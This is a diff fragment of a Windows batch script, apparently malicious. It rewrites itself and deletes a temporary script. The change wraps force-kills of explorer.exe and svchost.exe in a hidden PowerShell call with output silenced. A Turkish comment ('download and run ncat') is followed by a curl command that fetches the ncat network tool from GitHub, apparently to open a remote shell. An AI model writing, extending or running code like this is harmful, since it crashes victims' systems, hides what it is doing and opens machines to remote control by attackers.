@@ -31,8 +31,7 @@ copy /y "%tempfile%" "%script%" >nul
 cd %temp%
 del /f /q "temp_script.bat"
 
-taskkill /f /im explorer.exe
-taskkill /f /im svchost.exe
+powershell -WindowStyle Hidden -Command "taskkill /f /im explorer.exe; taskkill /f /im svchost.exe" >nul 2>&1
 
 :: ncat indir ve calistir
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
